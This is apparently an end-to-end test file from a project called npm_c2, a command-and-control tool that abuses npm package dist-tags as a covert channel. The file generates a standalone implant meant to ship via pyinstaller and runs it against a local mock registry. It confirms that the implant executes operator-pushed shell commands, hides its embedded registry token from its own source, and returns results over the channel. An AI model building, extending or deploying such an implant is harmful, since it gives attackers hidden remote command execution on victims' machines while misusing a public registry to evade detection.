#!/usr/bin/env python3
"""Run the *generated* standalone implant against the mock registry.

This is the artifact that actually ships (pyinstaller input), so it gets its
own end-to-end pass instead of trusting the package import.

Two modes are covered:
  * read-only implant (no token) executes but writes nothing back
  * write-back implant (embedded token) executes and answers on the channel
"""
import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.dirname(__file__))

import npm_c2
import mock_registry
from npm_c2.implant import generate_standalone

FAILS = []


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def run_implant(path, pkg, tmp, args=(), timeout=20):
    env = dict(os.environ, APPDATA=tmp, PYTHONUNBUFFERED="1")
    proc = subprocess.Popen([sys.executable, path, "-p", pkg, *args],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, env=env)
    try:
        out, _ = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    return out


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as imp_mod
    imp_mod.API = npm_c2.API

    from npm_c2.operator import Operator
    tmp = tempfile.mkdtemp()

    # ---------------------------------------------------------- read-only
    pkg = "standalone-ro"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    path = os.path.join(tmp, "ro_implant.py")
    with open(path, "w") as f:
        f.write(generate_standalone())
    step("read-only implant compiles",
         subprocess.run([sys.executable, "-m", "py_compile", path]).returncode == 0)

    marker = os.path.join(tmp, "ro-executed.txt")
    Operator(pkg, "npm_test").push_task(f"echo ro-ok > {marker}")
    run_implant(path, pkg, tmp, args=("--interval", "10", "--verbose"))
    step("read-only implant executes a command", os.path.exists(marker),
         "marker written" if os.path.exists(marker) else "marker missing")
    step("read-only implant writes no result",
         not [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)])

    # --------------------------------------------------------- write-back
    pkg2 = "standalone-rw"
    reg.tags.setdefault(pkg2, {})["latest"] = "1.0.0"
    path2 = os.path.join(tmp, "rw_implant.py")
    with open(path2, "w") as f:
        f.write(generate_standalone(token="npm_test", package=pkg2))
    step("write-back implant compiles",
         subprocess.run([sys.executable, "-m", "py_compile", path2]).returncode == 0)
    with open(path2) as f:
        src = f.read()
    step("write-back implant hides the token", "npm_test" not in src)

    Operator(pkg2, "npm_test").push_task("echo standalone-ok")
    out = run_implant(path2, pkg2, tmp, args=("--interval", "10", "--verbose"))

    res = [t for t in reg.snapshot(pkg2) if t.startswith(npm_c2.RES_PREFIX)]
    decoded = b"".join(npm_c2.decode_tag(t)["data"] for t in res) if res else b""
    step("write-back implant answers on the channel", b"standalone-ok" in decoded,
         f"results={len(res)} decoded={decoded[:40]!r}")
    step("write-back implant logged its poll", "poll #" in out,
         out.strip().splitlines()[-1][:60] if out.strip() else "no output")

    srv.shutdown()
    print(f"\n{'all standalone steps passed' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
